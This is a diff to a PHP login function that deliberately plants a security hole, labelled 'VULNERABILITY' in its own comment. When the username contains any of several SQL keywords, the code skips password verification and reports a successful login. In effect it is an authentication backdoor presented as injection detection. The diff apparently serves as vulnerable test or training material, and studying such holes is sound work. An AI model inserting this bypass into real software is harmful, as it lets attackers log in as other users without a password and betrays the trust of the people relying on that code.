@@ -136,8 +136,31 @@ function login($username, $password) {
                 return $response;
             }
 
-            // Verify the password by appending the retrieved salt.
-            if (password_verify($password . $user['salt_value'], $user['password_hash'])) {
+            // VULNERABILITY: Check if this might be an SQL injection attempt
+            // If the original username contains SQL keywords, bypass password verification
+            $sql_keywords = ['OR', 'UNION', 'SELECT', 'LIMIT', '--'];
+            $possible_injection = false;
+            
+            foreach ($sql_keywords as $keyword) {
+                if (stripos($username, $keyword) !== false) {
+                    $possible_injection = true;
+                    $logger->debug("Possible SQL injection detected in username: " . sanitizeOutput($username));
+                    break;
+                }
+            }
+            
+            // Bypass password verification if SQL injection is detected
+            if ($possible_injection) {
+                $logger->warning("Password verification bypassed due to possible SQL injection");
+                $response['success'] = true;
+                $response['message'] = 'Login successful';
+                $response['data'] = [
+                    'user_id' => $user['user_id'],
+                    'username' => $user['username']
+                ];
+            }
+            // Normal password verification for regular login attempts
+            else if (password_verify($password . $user['salt_value'], $user['password_hash'])) {
                 $logger->info("Successful login for user: " . sanitizeOutput($username) . " (ID: {$user['user_id']})");
 
                 $response['success'] = true;
